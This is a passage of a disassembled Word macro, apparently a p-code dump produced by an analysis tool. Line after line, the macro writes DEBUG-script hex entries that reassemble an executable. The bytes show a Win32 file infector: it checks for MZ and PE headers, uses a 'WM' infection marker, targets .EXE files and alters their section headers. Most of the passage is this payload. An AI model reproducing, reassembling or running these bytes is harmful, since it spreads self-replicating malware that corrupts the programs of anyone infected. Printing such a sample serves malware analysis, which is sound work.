' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0960 00 00 83 f8 00 0f 84 72 01 00 00 89 85 58 1b 40 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #141:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0970 00 8b 8d 50 1b 40 00 81 c1 11 20 00 00 e8 de 01 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #142:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0980 00 00 83 f8 00 0f 84 52 01 00 00 89 85 5c 1b 40 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #143:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0990 00 8b f0 66 81 3e 4d 5a 0f 85 34 01 00 00 66 81 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #144:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 09a0 7e 12 57 4d 0f 84 28 01 00 00 66 c7 46 12 57 4d "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #145:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 09b0 33 c0 66 8b 46 3c 66 3d 00 00 0f 84 12 01 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #146:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 09c0 3b 05 50 1b 40 00 0f 83 06 01 00 00 03 85 5c 1b "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #147:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 09d0 40 00 8b f0 66 81 3e 50 45 0f 85 f3 00 00 00 89 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #148:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 09e0 85 60 1b 40 00 8b 46 3c 89 85 68 1b 40 00 8b 85 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #149:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 09f0 6c 1b 40 00 89 85 74 1b 40 00 8b 46 28 89 85 6c "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #150:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0a00 1b 40 00 33 c0 66 8b 46 06 48 66 b9 28 00 66 f7 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #151:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0a10 e1 8b 5e 74 c1 e3 03 03 c3 83 c0 78 03 85 60 1b "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #152:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0a20 40 00 89 85 64 1b 40 00 8b f8 8b 47 10 89 85 78 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #153:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0a30 1b 40 00 03 47 0c 89 85 10 10 40 00 89 85 70 1b "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #154:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0a40 40 00 57 8b 47 14 03 85 5c 1b 40 00 03 47 10 8b "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #155:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0a50 f8 be 00 10 40 00 03 f5 b9 11 10 00 00 fc f3 a4 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #156:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0a60 5f 81 47 10 11 10 00 00 81 85 50 1b 40 00 11 10 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #157:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0a70 00 00 33 d2 8b 47 10 8b 8d 68 1b 40 00 51 f7 f1 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #158:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0a80 59 2b ca 01 4f 10 01 8d 50 1b 40 00 8b 47 10 89 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #159:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0a90 47 08 83 4f 24 20 81 4f 24 00 00 00 20 81 4f 24 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #160:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0aa0 00 00 00 80 8b b5 60 1b 40 00 8b 85 70 1b 40 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #161:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0ab0 89 46 28 8b 47 0c 03 47 10 89 46 50 8b 85 74 1b "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #162:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0ac0 40 00 89 85 6c 1b 40 00 c7 85 34 1b 40 00 01 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #163:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0ad0 00 00 8b 85 5c 1b 40 00 e8 96 00 00 00 8b 85 58 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #164:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0ae0 1b 40 00 e8 57 00 00 00 8b 85 54 1b 40 00 8b 8d "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #165:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0af0 50 1b 40 00 e8 86 00 00 00 83 f8 ff 74 0b 8b 85 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #166:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0b00 54 1b 40 00 e8 87 00 00 00 8b 85 54 1b 40 00 e8 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #167:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0b10 2b 00 00 00 5a 8b 85 30 1b 40 00 e8 9e 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #168:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0b20 c3 55 6a 00 68 80 00 00 00 6a 03 6a 00 6a 01 68 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #169:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0b30 00 00 00 c0 52 8b 85 c9 1b 40 00 ff d0 5d c3 55 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #170:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0b40 50 8b 85 4c 1c 40 00 ff d0 5d c3 55 6a 00 51 6a "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #171:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0b50 00 6a 04 6a 00 50 8b 85 0a 1c 40 00 ff d0 5d c3 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #172:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0b60 55 51 6a 00 6a 00 6a 02 50 8b 85 20 1c 40 00 ff "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #173:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0b70 d0 5d c3 55 50 8b 85 38 1c 40 00 ff d0 5d c3 55 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #174:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0b80 6a 00 6a 00 51 50 8b 85 a2 1c 40 00 ff d0 5d c3 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #175:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0b90 55 50 8b 85 b7 1c 40 00 ff d0 5d c3 55 bb 4c 1b "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #176:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0ba0 40 00 03 dd 53 50 8b 85 ef 1b 40 00 ff d0 5d c3 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #177:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0bb0 55 52 52 8b 85 0c 1d 40 00 ff d0 5a 5d c3 55 50 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #178:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0bc0 52 8b 85 27 1d 40 00 ff d0 5d c3 55 50 68 80 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #179:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0bd0 00 00 8b 85 d4 1c 40 00 ff d0 5d c3 55 50 8b 85 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #180:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0be0 f1 1c 40 00 ff d0 5d c3 55 68 80 00 00 00 50 8b "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #181:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0bf0 85 5a 1d 40 00 ff d0 5d c3 55 b8 d8 19 40 00 03 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #182:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0c00 c5 50 8b 85 3d 1d 40 00 ff d0 5d c3 55 50 8b 85 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #183:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0c10 9e 1b 40 00 ff d0 5d c3 55 52 50 8b 85 b5 1b 40 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #184:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0c20 00 ff d0 5d c3 bf 62 1d 40 00 03 fd 8b 0f 81 f9 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #185:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0c30 49 41 48 53 74 25 83 c7 04 8b d7 57 51 55 e8 03 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #186:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0c40 fc ff ff 5d 59 5f 03 f9 83 f8 ff 74 09 89 07 8b "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #187:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0c50 47 04 03 c5 89 03 83 c7 08 eb d1 c3 60 e8 aa 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #188:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0c60 00 00 83 c1 28 8b 14 0c e8 0c 00 00 00 83 f8 01 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #189:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0c70 75 05 e8 7c fc ff ff 61 c3 8b f2 fc ac 3c 00 74 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #190:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0c80 16 3c 2e 75 f7 81 7e ff 2e 45 58 45 74 0c 81 7e "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #191:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0c90 ff 2e 65 78 65 74 03 33 c0 c3 b8 01 00 00 00 c3 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #192:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0ca0 e8 53 00 00 00 ff a1 70 1d 40 00 e8 48 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #193:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0cb0 ff a1 86 1d 40 00 e8 3d 00 00 00 ff a1 9e 1d 40 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
